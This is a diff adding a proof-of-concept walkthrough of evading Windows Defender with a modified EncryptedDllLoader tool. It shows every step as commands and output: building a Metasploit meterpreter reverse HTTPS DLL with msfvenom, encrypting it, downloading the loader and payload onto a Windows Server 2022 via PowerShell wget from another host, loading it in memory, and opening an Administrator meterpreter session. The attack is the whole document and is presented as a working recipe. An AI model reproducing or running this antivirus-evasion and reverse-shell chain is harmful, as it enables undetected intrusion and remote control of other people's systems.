@@ -1,0 +1,181 @@
+=====================================================================================================================================================================
+AV bypass using the tool 'EncryptedDllLoader'
+=====================================================================================================================================================================
+
+=> https://github.com/in0finite/EncryptedDllLoader
+
+'EncryptedDllLoader' is a (old) tool which can load and execute in-memory encrypted .DLL file to avoid AV detection.
+
+It has 4 options:
+------------------
+> encrypt DLL           - produces encrypted DLL from myfile.txt and names it myfile.txt.enc
+> decrypt DLL           - decrypts myfile.txt.enc to myfile.txt.enc.dec
+> test encryption       - tries to encrypt myfile.txt and then decrypt it (without saving new file), then compares result with original file
+> load encrypted DLL    - loads myfile.txt.enc into memory, decrypts memory, then loads DLL from memory using this
+                          (https://github.com/fancycode/MemoryModule)
+
+It uses hardcoded key for encryption/decryption, but this behavior can be easily changed (and it should be changed).
+Encryption is done using vigenere cipher - not very strong encryption algorithm, but it does the job.
+
+
+=====================================================================================================================================================================
+Basic Poc - Load & execute (in-memory) an encrypted DLL (Metasploit C2) on a Windows server 2022 without being detected by Windows Defender
+=====================================================================================================================================================================
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 1.  Download, modify/obfuscate and compile the source code 
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+=> Github: https://github.com/in0finite/EncryptedDllLoader
+
+Build started...
+1>------ Build started: Project: DllLoader, Configuration: Debug x64 ------
+1>C:\Temp\EncryptedDllLoader-master\DllLoader\vigenere.h(25,25): warning C4267: 'initializing': conversion from 'size_t' to 'int', possible loss of data
+1>C:\Temp\EncryptedDllLoader-master\DllLoader\vigenere.h(27,25): warning C4267: 'initializing': conversion from 'size_t' to 'int', possible loss of data
+1>C:\Temp\EncryptedDllLoader-master\DllLoader\vigenere.h(40,25): warning C4267: 'initializing': conversion from 'size_t' to 'int', possible loss of data
+1>C:\Temp\EncryptedDllLoader-master\DllLoader\vigenere.h(40,46): warning C4267: 'initializing': conversion from 'size_t' to 'int', possible loss of data
+1>C:\Temp\EncryptedDllLoader-master\DllLoader\vigenere.h(40,51): warning C4101: 'j': unreferenced local variable
+1>C:\Temp\EncryptedDllLoader-master\DllLoader\vigenere.h(62,34): warning C4267: 'initializing': conversion from 'size_t' to 'int', possible loss of data
+1>C:\Temp\EncryptedDllLoader-master\DllLoader\DllLoader.cpp(250,82): warning C4267: 'argument': conversion from 'size_t' to 'unsigned int', possible loss of data
+1>C:\Temp\EncryptedDllLoader-master\DllLoader\DllLoader.cpp(284,77): warning C4267: 'argument': conversion from 'size_t' to 'unsigned int', possible loss of data
+1>C:\Temp\EncryptedDllLoader-master\DllLoader\MemoryModule.c(1134,5): warning C4996: 'wcsncpy': This function or variable may be unsafe. Consider using wcsncpy_s instead. 
+To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.
+1>Done building project "DllLoader.vcxproj".
+========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==========
+========== Build started at 8:52 PM and took 01.844 seconds ==========
+
+Original tool's output
+-----------------------
+
+C:\temp> DllLoader.exe
+Enter option:
+1 - encrypt file
+2 - decrypt file
+3 - test encryption
+4 - load encrypted dll
+
+Modified version's output
+--------------------------
+
+C:\temp> audit.exe
+Enter option:
+1 - Encrypt
+2 - Load
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Generate a Metasploit HTTPs reverse shell in the ".DLL" format and encrypt it with the tool 'EncryptedDllLoader' (named "audit.exe" in this PoC)
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+┌──(kali㉿kali)-[~/Documents/Tools/C2-Metasploit]
+└─$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread LHOST=192.168.1.147 LPORT=443 -a x64 -f dll -o MSF.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 204892 bytes
+Final size of dll file: 267264 bytes
+Saved as: MSF.dll
+
+=> Rename the file "MSF.dll" as "audit.txt" and place it in the same directory than the tool. Then use tool to encrypt it.
+   Note: with the original source code the .dll should have been rename as "myfile.txt".
+
+C:\temp> audit.exe
+Enter option:
+1 - Encrypt
+2 - Load
+1
+encrypting audit.txt
+encrypted file: audit.txt.enc
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Upload the tool and the encrypted dll (named "audit.txt.enc" in this PoC) on a Windows server 2022 and than use it to load and execute in-memory the 
+         encrypted DLL (Metasploit C2 implant) without being detected by Windows Defender
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+icrosoft Windows [Version 10.0.20348.4052]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator> cd C:\temp
+
+C:\temp> systeminfo
+
+Host Name:                 SERVER-WIN2022
+OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
+OS Version:                10.0.20348 N/A Build 20348
+OS Manufacturer:           Microsoft Corporation
+<SNIP>
+
+C:\temp> powershell -c "Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,AntispywareEnabled, 
+                        AntivirusSIgnatureLastUpdated|FL"
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+BehaviorMonitorEnabled        : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSIgnatureLastUpdated : 8/15/2025 5:28:34 AM
+
+C:\temp> powershell -c "wget -uri http://192.168.1.23:8080/audit.exe -OutFile C:\temp\audit.exe"
+C:\temp> powershell -c "wget -uri http://192.168.1.23:8080/audit.txt.enc -OutFile C:\temp\audit.txt.enc"
+
+C:\temp> audit.exe
+Enter option:
+1 - Encrypt
+2 - Load
+2
+decrypting
+loading dll
+
+C:\temp>
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 4 - Enjoy the Metasploit reverse shell running on the target Windows server 2022 (without being detected by the MS Defender AV)
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+┌──(kali㉿kali)-[~]
+└─$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST 192.168.1.147; set LPORT 443; set EXITFUNC thread; run -j"
+[sudo] password for kali:
+
+       =[ metasploit v6.4.69-dev                          ]
++ -- --=[ 2529 exploits - 1299 auxiliary - 431 post       ]
++ -- --=[ 1678 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+Metasploit Documentation: https://docs.metasploit.com/
+
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/meterpreter_reverse_https
+LHOST => 192.168.1.147
+LPORT => 443
+EXITFUNC => thread
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) >
+[*] Started HTTPS reverse handler on https://192.168.1.147:443
+
+[*] https://192.168.1.147:443 handling request from 192.168.1.25; (UUID: 73lonpmq) Redirecting stageless connection from /Z4szSieE_qE8NT03VKqpHAnRrdkdRy6Ey with UA 
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
+[*] https://192.168.1.147:443 handling request from 192.168.1.25; (UUID: 73lonpmq) Attaching orphaned/stageless session...
+
+[*] Meterpreter session 1 opened (192.168.1.147:443 -> 192.168.1.25:49758) at 2025-08-15 16:14:34 -0400
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                    Connection
+  --  ----  ----                     -----------                                    ----------
+  1         meterpreter x64/windows  SERVER-WIN2022\Administrator @ SERVER-WIN2022  192.168.1.147:443 -> 192.168.1.25:49758 (192.168.1.25)
+
+msf6 exploit(multi/handler) >
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: SERVER-WIN2022\Administrator
+
+meterpreter > exit
+[*] Shutting down session: 1
+
+[*] 192.168.1.25 - Meterpreter session 1 closed.  Reason: User exit
+msf6 exploit(multi/handler) >
+
